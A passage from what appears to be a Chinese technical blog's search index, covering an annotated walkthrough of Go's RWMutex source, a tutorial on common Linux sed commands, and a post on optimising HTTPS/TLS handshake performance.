operator">=</span> rw<span class="token punctuation">.</span>w<span class="token punctuation">.</span>state     race<span class="token punctuation">.</span><span class="token function">Disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 1.使用 Mutex 锁，解决与其他写者的竞争</span> rw<span class="token punctuation">.</span>w<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 2.判断当前是否存在读锁：先通过原子操作改变readerCount（readerCount-rwmutexMaxReaders），</span> <span class="token comment">// 使其变为负数，告诉 RUnLock 当前存在写锁等待；</span> <span class="token comment">// 然后再加回 rwmutexMaxReaders 并赋给r，若r仍然不为0, 代表当前还有读锁</span> r <span class="token operator">:=</span> atomic<span class="token punctuation">.</span><span class="token function">AddInt32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerCount<span class="token punctuation">,</span> <span class="token operator">-</span>rwmutexMaxReaders<span class="token punctuation">)</span> <span class="token operator">+</span> rwmutexMaxReaders <span class="token comment">// 3.如果仍然有其他 Goroutine 持有互斥锁的读锁（r != 0）</span> <span class="token comment">// 会先将 readerCount 的值加到 readerWait中，防止源源不断的读者进来导致写锁饿死，</span> <span class="token comment">// 然后该 Goroutine 会调用 sync.runtime_SemacquireMutex 进入休眠状态，</span> <span class="token comment">// 并等待所有读锁所有者执行结束后释放 writerSem 信号量将当前协程唤醒。</span> <span class="token keyword">if</span> r <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> atomic<span class="token punctuation">.</span><span class="token function">AddInt32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerWait<span class="token punctuation">,</span> r<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// 阻塞写锁</span>     <span class="token function">runtime_SemacquireMutex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>writerSem<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 竞态检测</span> <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span>     race<span class="token punctuation">.</span><span class="token function">Enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     race<span class="token punctuation">.</span><span class="token function">Acquire</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerSem<span class="token punctuation">)</span><span class="token punctuation">)</span>     race<span class="token punctuation">.</span><span class="token function">Acquire</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>writerSem<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>使用 <code>sync.Mutex</code> 中的互斥锁 <code>sync.Mutex.Lock()</code> 先解决与其他写者的竞争问题；</li><li>判断当前是否存在读锁：先通过原子操作改变<code>readerCount（readerCount-rwmutexMaxReaders）</code>，使其变为负数，告诉 RUnLock 当前存在写锁等待，然后再加回<code>rwmutexMaxReaders</code> 并赋给r，若r仍然不为0，代表当前还有读锁</li><li>判断是否还有其他 <code>Goroutine</code> 持有<code>RWMutex</code>互斥锁的读锁（r !&#x3D; 0），如果有则会先将当前的 <code>readerCount</code> 的数量加到 <code>readerWait</code>中，从而防止后面源源不断的读者请求读锁，从而进来导致写锁饿死的情况发生，然后该 <code>Goroutine</code> 会调用 <code>sync.runtime_SemacquireMutex</code> 进入休眠状态，并等待当前持有读锁的 <code>Goroutine</code> 结束后释放 <code>writerSem</code> 信号量将当前 <code>Goroutine</code> 唤醒。</li></ol></li><li><p>写锁释放 UnLock()</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>rw <span class="token operator">*</span>RWMutex<span class="token punctuation">)</span> <span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 竞态检测</span> <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span>     <span class="token boolean">_</span> <span class="token operator">=</span> rw<span class="token punctuation">.</span>w<span class="token punctuation">.</span>state     race<span class="token punctuation">.</span><span class="token function">Release</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerSem<span class="token punctuation">)</span><span class="token punctuation">)</span>     race<span class="token punctuation">.</span><span class="token function">Disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 1.释放读锁：通过调用 atomic.AddInt32 函数将 readerCount 加上 rwmutexMaxReaders 从而变回正数；；</span> r <span class="token operator">:=</span> atomic<span class="token punctuation">.</span><span class="token function">AddInt32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerCount<span class="token punctuation">,</span> rwmutexMaxReaders<span class="token punctuation">)</span> <span class="token comment">// 若超过读锁的最大限制, 触发panic</span> <span class="token keyword">if</span> r <span class="token operator">>=</span> rwmutexMaxReaders <span class="token punctuation">&#123;</span>     race<span class="token punctuation">.</span><span class="token function">Enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token function">throw</span><span class="token punctuation">(</span><span class="token string">"sync: Unlock of unlocked RWMutex"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 2.通过 for 循环触发所有由于获取读锁而陷入等待的 Goroutine，也即解除阻塞的读锁(若有)</span> <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">int</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>     <span class="token function">runtime_Semrelease</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerSem<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 3.调用 sync.Mutex.Unlock 方法释放写互斥锁</span> rw<span class="token punctuation">.</span>w<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 是否开启竞态检测</span> <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span>     race<span class="token punctuation">.</span><span class="token function">Enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>释放读锁：通过调用 <code>atomic.AddInt32</code> 函数将 <code>readerCount</code> 加上 <code>rwmutexMaxReaders</code> 从而变回正数；</li><li>通过 for 循环触发所有由于获取读锁而陷入等待的 Goroutine，也即解除阻塞的读锁(若有)；</li><li>调用 <code>sync.Mutex.Unlock()</code> 方法释放写互斥锁。</li></ol></li><li><p>读锁加锁 RLock()</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>rw <span class="token operator">*</span>RWMutex<span class="token punctuation">)</span> <span class="token function">RLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 是否开启检测race</span> <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span>     <span class="token boolean">_</span> <span class="token operator">=</span> rw<span class="token punctuation">.</span>w<span class="token punctuation">.</span>state     race<span class="token punctuation">.</span><span class="token function">Disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">//这里分两种情况:</span> <span class="token comment">// 1.此时无写锁 (readerCount + 1) > 0,那么可以上读锁, 并且readerCount原子加1(读锁可重入[只要匹配了释放次数就行])</span> <span class="token comment">// 2.此时有写锁 (readerCount + 1) &lt; 0,所以通过readerSem读信号量, 使读操作睡眠等待</span> <span class="token keyword">if</span> atomic<span class="token punctuation">.</span><span class="token function">AddInt32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerCount<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// 当前有个写锁, 读操作需要阻塞等待写锁释放；</span>     <span class="token comment">// 其实做的事情是将 goroutine 排到G队列的后面,挂起 goroutine</span>     <span class="token function">runtime_SemacquireMutex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerSem<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 是否开启检测race</span> <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span>     race<span class="token punctuation">.</span><span class="token function">Enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     race<span class="token punctuation">.</span><span class="token function">Acquire</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerSem<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>此时无写锁 <code>(readerCount + 1) &gt; 0</code>（注意，在写锁是加锁那里，我们对readerCount 进行了<code>readerCount-rwmutexMaxReaders</code>处理），那么可以上读锁, 并且<code>readerCount</code>原子加1（读锁可重入[只要匹配了释放次数就行]）；</li><li>此时有写锁 <code>(readerCount + 1) &lt; 0,</code>所以通过<code>readerSem</code>读信号量, 使读操作睡眠等待；</li></ol></li><li><p>读锁释放 RUnlock()</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>rw <span class="token operator">*</span>RWMutex<span class="token punctuation">)</span> <span class="token function">RUnlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 竞态检测</span> <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span>     <span class="token boolean">_</span> <span class="token operator">=</span> rw<span class="token punctuation">.</span>w<span class="token punctuation">.</span>state     race<span class="token punctuation">.</span><span class="token function">ReleaseMerge</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>writerSem<span class="token punctuation">)</span><span class="token punctuation">)</span>     race<span class="token punctuation">.</span><span class="token function">Disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 写锁等待状态，检查当前是否可以进行获取；</span> <span class="token comment">// 首先将 readerCount 减1并赋予r，然后分两种情况判断</span> <span class="token comment">//  1.若r大于等于0，读锁直接解锁成功，直接结束本次操作；</span> <span class="token comment">//  2.若r小于0，有一个正在执行的写操作，在这时会调用sync.RWMutex.rUnlockSlow 方法；</span> <span class="token keyword">if</span> r <span class="token operator">:=</span> atomic<span class="token punctuation">.</span><span class="token function">AddInt32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerCount<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> r <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// Outlined slow-path to allow the fast-path to be inlined</span>     rw<span class="token punctuation">.</span><span class="token function">rUnlockSlow</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span>     race<span class="token punctuation">.</span><span class="token function">Enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>rw <span class="token operator">*</span>RWMutex<span class="token punctuation">)</span> <span class="token function">rUnlockSlow</span><span class="token punctuation">(</span>r <span class="token builtin">int32</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// r + 1 == 0 表示本来就没读锁, 直接执行RUnlock()</span> <span class="token comment">// r + 1 == -rwmutexMaxReaders 表示执行Lock()再执行RUnlock()</span> <span class="token keyword">if</span> r<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> r<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token operator">-</span>rwmutexMaxReaders <span class="token punctuation">&#123;</span>     race<span class="token punctuation">.</span><span class="token function">Enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token function">throw</span><span class="token punctuation">(</span><span class="token string">"sync: RUnlock of unlocked RWMutex"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 如果当前有写锁等待，则减少一个readerWait的数目</span> <span class="token keyword">if</span> atomic<span class="token punctuation">.</span><span class="token function">AddInt32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>readerWait<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// 写锁前的最后一个读锁唤醒写锁执行</span>     <span class="token function">runtime_Semrelease</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rw<span class="token punctuation">.</span>writerSem<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>首先readerCount 减1，然后进行两种情况的判断：</p><ol><li>若 r 大于等于0，读锁直接解锁成功，直接结束本次操作；</li><li>若 r 小于0， 有一个正在执行的写操作，在这时会调用<code>sync.RWMutex.rUnlockSlow</code> 方法；</li></ol></li><li><p>然后倘若上面判断 r 小于0，则进入 <code>rUnlockSlow()</code> 慢解锁，先进行一个判断，若有以下两种情况发生：<code>r + 1 == 0</code>表示直接执行<code>RUnlock()</code> ，<code>r + 1 == -rwmutexMaxReaders</code>表示执行 <code>Lock()</code> 再执行 <code>RUnlock()</code>，这两种情况都会进行报错。</p></li><li><p>如果没有上述两种情况发生，则<code>sync.RWMutex.rUnlockSlow</code> 会减少获取锁的写操作等待的读操作数 <code>readerWait</code> ，并在所有读操作都被释放之后触发写操作的信号量 <code>writerSem</code>，该信号量被触发时，调度器就会唤醒尝试获取写锁的 <code>Goroutine</code>。</p></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令 - sed</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-18-Linux-sed%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-18-Linux-sed%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="sed是什么"><a href="#sed是什么" class="headerlink" title="sed是什么"></a>sed是什么</h2><p>sed是stream editor的简称，也就是流编辑器。它一次处理一行内容，处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，不断重复，直到文件末尾。文件内容不会改变，除非使用重定向输出。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span> <span class="token string">'command'</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常用option：</p><blockquote><p>-n 或–quiet或–silent 仅显示script处理后的结果.</p><p>-e ‘脚本’或–expression&#x3D;脚本 以选项中指定的script来处理输入的文本文件。</p><p>-f &lt;script文件&gt;或–file&#x3D;&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。</p><p>-r 让sed命令支持扩展的正则表达式(默认是基础正则表达式)。</p></blockquote><p>动作说明：</p><blockquote><p>a: 新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)。</p><p>c: 取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行。</p><p>d: 删除</p><p>i: 插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)。</p><p>p: 打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行</p><p>s: 取代，可以直接进行取代的工作。通常这个 s 的动作可以搭配正则表达式</p></blockquote><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><p>插入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在第一行前添加字符串</span><span class="token function">sed</span> <span class="token string">'1i\添加的内容'</span> <span class="token function">file</span><span class="token comment"># 在最后一行行前添加字符串</span><span class="token function">sed</span> <span class="token string">'$i\添加的内容'</span> <span class="token function">file</span><span class="token comment"># 在最后一行行后添加字符串</span><span class="token function">sed</span> <span class="token string">'$a\添加的内容'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>替换</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注释掉含有“swap”的行</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/^[^#].*swap*/#&amp;/g'</span> fstab<span class="token comment"># 取消含有字符串swap的行最前面的注释符号#</span><span class="token comment">## //两杠表示空格，以空格替换#，等价取消#。</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'/^#.*swap/s/^#//g'</span> fstab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>删除</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除第2行</span><span class="token function">sed</span> <span class="token string">'2d'</span> filename<span class="token comment"># 删除1-4行</span><span class="token function">sed</span> <span class="token string">'1,4d'</span> filename<span class="token comment"># 删除1行和后2行,共3行</span><span class="token function">sed</span> <span class="token string">'1,+2d'</span> filename<span class="token comment"># 删除匹配到Coder的行和其后面的2行</span><span class="token function">sed</span> <span class="token string">'/Coder/,+2d'</span> filename<span class="token comment"># 删除奇数行</span><span class="token function">sed</span> <span class="token string">'1~2d'</span> filename<span class="token comment"># 删除偶数行</span><span class="token function">sed</span> <span class="token string">'2~2d'</span> filename<span class="token comment"># 删除匹配Coder的行</span><span class="token function">sed</span> <span class="token string">'/Coder/d'</span> filename<span class="token comment"># 删除所有空行</span><span class="token function">sed</span> <span class="token string">'/^$/d'</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础-https-优化</title>
      <link href="/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-https-%E4%BC%98%E5%8C%96/"/>
      <url>/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-https-%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTPS如何优化"><a href="#HTTPS如何优化" class="headerlink" title="HTTPS如何优化"></a>HTTPS如何优化</h2><h3 id="分析性能损耗"><a href="#分析性能损耗" class="headerlink" title="分析性能损耗"></a>分析性能损耗</h3><ul><li>TLS协议握手过程<ul><li>TLS握手过程增加了网络延迟（2RTT）</li><li>对于ECDHE密钥协商算法，握手过程中客户端和服务端都需要临时生成椭圆曲线公钥</li><li>客户端在验证证书是，会访问CA获取CRL或OCSP，目的是验证服务器证书是否有被吊销</li><li>双方计算Pre-Master，也就是对称加密密钥</li></ul></li><li>握手后的对称加密报文传输<ul><li>现在主流的对称加密算法AES、ChaCha20，而且一些CPU厂商还针对他们做了硬件级别的优化，因此这个环节的性能消耗非常小</li></ul></li></ul><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4@main/%E7%BD%91%E7%BB%9C/https%E4%BC%98%E5%8C%96/tls%E6%80%A7%E8%83%BD%E6%8D%9F%E8%80%97.png" alt="img" style="zoom:67%;" /><h3 id="硬件优化"><a href="#硬件优化" class="headerlink" title="硬件优化"></a>硬件优化</h3><ul><li>选择支持AES-NI特性的CPU</li><li>如果CPU不支持，可以选择ChaCha20对称加密算法，运算指令对CPU更友好一点</li></ul><h3 id="软件优化"><a href="#软件优化" class="headerlink" title="软件优化"></a>软件优化</h3><ul><li>软件升级：Linux内核升级、OpenSSL升级</li></ul><h3 id="协议优化"><a href="#协议优化" class="headerlink" title="协议优化"></a>协议优化</h3><h4 id="密钥交换算法优化"><a href="#密钥交换算法优化" class="headerlink" title="密钥交换算法优化"></a>密钥交换算法优化</h4><p>TLS1.2版版如果使用RSA算法，那么需要4次握手，也就是要花费2RTT，才可以进行应用数据的传输，而且RSA算法不具备前向安全性。不仅慢，而且安全性不高。</p><p>如果可以使用ECDHE算法，由于支持False Start（抢跑），客户端可以摘TLS协议的第三次握手有，第四次握手前，发送加密的应用数据，以此将TLS握手的消息往返由2RTT减少到1RTT，而且安全性也高，具备前向安全性。</p><p>ECDHE算法是基于椭圆曲线实现的，不同椭圆曲线性能也不同，应该尽量选择x25519曲线，该曲线是目前最快的椭圆曲线。比如在Nginx上，可以使用ssl_ecdh_curve指令配置想使用的椭圆曲线，把有限使用的放在前面。</p><pre class="line-numbers language-none"><code class="language-none">ssl_ecdh_curve X25519:secp384r1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于对称加密算法方面，如果安全性不是特别高的要求，可以选用AES_128_GCM，它比AES_256_GCM快一些，因为秘钥长度短。比如在Nginx上可以使用ssl_ciphers指令配置想使用的非对称加密和对称加密算法，也就是密码套件，而且吧性能最快最安全的放在最前面。</p><pre class="line-numbers language-none"><code class="language-none">ssl_ciphers &#39;EECDH+ECDSA+AES128+SHA:RSA+AES128+SHA&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TLS升级"><a href="#TLS升级" class="headerlink" title="TLS升级"></a>TLS升级</h4><p>如果可以，直接把TLS1.2升级成TLS1.3。TLS1.3大幅简化了握手的步骤，完成TLS握手只要1RTT，而且安全性更高。</p><p>TLS1.2的握手中，一般需要4次握手，先要通过Client Hello和Server Hello消息协商出后续使用的加密算法，再互相交换公钥，然后计算出最终的会话秘钥</p><ul><li><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4@main/%E7%BD%91%E7%BB%9C/https%E4%BC%98%E5%8C%96/tls1.2and1.3.png" alt="img" style="zoom:50%;" /></li></ul><p>TLS1.3的握手过程，把Hello和公钥交换着两个消息合并成了一个消息，于是这样就减少到只需要1RTT就能完成TLS握手。怎么合并的和，具体做饭是在客户端Client Hello消息里带上直尺的椭圆曲线，依旧椭圆曲线对应的公钥；服务端收到后，选定一个椭圆曲线，然后返回消息时，带上服务端的公钥。经过这1个RTT双方都已经有生成会话秘钥的材料了，于是客户端算出会话秘钥，就可以进行应用数据的加密传输了。</p><p>而且，TLS1.2对密码套件进行了减肥，对于秘钥交换算法，废除了不支持前向安全性的RSA和DH算法只支持ECDHE算法。对于对称加密和签名算法，只支持目前最安全的几个密码套件。</p><ul><li>TLS_AES_256_GCM_SHA384</li><li>TLS_CHACHA20_POLY1305_SHA256</li><li>TLS_AES_128_GCM_SHA256</li><li>TLS_AES_128_CCM_8_SHA256</li><li>TLS_AES_128_CCM_SHA256</li></ul><p>之所以仅仅支持这么骚的密码套件，是因为TLS1.2由于支持各种古老且不安全的密码套件，中间人可以利用降级攻击，伪造客户端的Client Hello消息，替换客户端支持的密码套件位一些安全的密码套件，使得服务器被迫使用这些密码套件进行HTTPS连接，从而破解密文</p><h3 id="证书优化"><a href="#证书优化" class="headerlink" title="证书优化"></a>证书优化</h3><h4 id="证书传输优化"><a href="#证书传输优化" class="headerlink" title="证书传输优化"></a>证书传输优化</h4><p>要让证书更便于传输，那必然是减少证书的大小，这样可以节约带宽，也能让客户端减少运算量。所以对于服务器的证书应该选择椭圆曲线（ECDHE）证书，而部署RSA证书，因为在相同的安全强度下，ECC秘钥长度比RSA短的多</p><h4 id="证书验证优化"><a href="#证书验证优化" class="headerlink" title="证书验证优化"></a>证书验证优化</h4><p>服务器向 CA 周期性地查询证书状态，获得一个带有时间戳和签名的响应结果并缓存它。服务器向 CA 周期性地查询证书状态，获得一个带有时间戳和签名的响应结果并缓存它。</p><h3 id="会话复用"><a href="#会话复用" class="headerlink" title="会话复用"></a>会话复用</h3><p>TLS我收的目的就是为了协商出会话密钥，也就是对称加密密钥，那么我们如果把首次TLS握手协商的对称加密密钥缓存起来，待下次需要建立HTTPS连接时，直接复用这个秘钥。</p><ul><li><p>Session ID</p><ul><li>客户端和服务端首次TLS握手连接后，双方会在内存缓存会话秘钥，并用唯一的sessionID来表示，sessionID和会话秘钥相当于key-value的关系</li><li>当客户端再次连接时，hello消息里会带上sessionID，服务器收到后就会从内存找，如果找到就直接用该会话秘钥恢复会话状态，跳过其余过程，只用一个消息往返就可以建立安全通信。当然为了安全性，内存中的会话秘钥会定期失效。</li><li>缺点<ul><li>服务端必须保持每一个客户端的会话秘钥，随着客户端增多，服务器的内存压力也越大</li><li>现在网站服务一般是由多台服务器通过负载均衡提供服务的，客户端再次连接不一定会命中上一次访问过的服务器，于是还要走完整的TLS握手过程</li></ul></li></ul></li><li><p>Session Ticket</p><ul><li>为了解决SessionID的问题，就出现了session ticker，服务器不在缓存每个客户端的会话秘钥，而是吧缓存的工作交给客户端，类似于HTTP的Cookie</li><li>客户端与服务器首次建立连接时，服务端会加密会话秘钥，作为Ticket发给客户端，交给客户端缓存该Ticket。客户端再次连接服务器时，客户端会发送Ticket，服务器解密后就可以获取上一次的会话秘钥，然后验证有效期，如果没问题，就可以恢复会话了，开始加密通信。</li><li>对于集群服务器的话，要确保每台服务器加密会话秘钥的秘钥是一致的，这样客户端携带Ticket访问任意一台服务器时，都能恢复会话。</li><li>SessionID和SessionTicket都不具备前向安全性，因为一旦加密的密钥被破解或者服务器泄露秘钥，前面劫持的通信密文都会被破解。同时应对重放攻击也很困难，重放攻击的危险在于，如果中间人截获了某个客户端的SessionID或SessionTicket以及Post报文，而一般Post请求会改变数据库的数据，中间人就利用此截获的报文，不断向服务器发送该报文，这样就会导致数据库的数据被中间人改变，而用户是不知情的。避免重放攻击的方式就是需要对绘画秘钥设定一个合理的过期时间，以及只针对安全的HTTP请求如Get和Head使用会话重用。</li></ul><h3 id="Pre-shared-Key"><a href="#Pre-shared-Key" class="headerlink" title="Pre-shared Key"></a>Pre-shared Key</h3><p>前面的SessionID和SessionTicket方式都需要在1RTT才能恢复会话。</p><p>而TLS1.3更为厉害，对于重连TLS1.3只需要0RTT，原理和Ticket类似，只不过在重连是，客户端会把Ticket和HTTP请求异同发送给服务端，这种方式叫Pre-shared Key。Pre-shared Key也有重放攻击的危险。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4@main/%E7%BD%91%E7%BB%9C/https%E4%BC%98%E5%8C%96/0-RTT.png" alt="img"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基础-https-ECDHE握手解析</title>
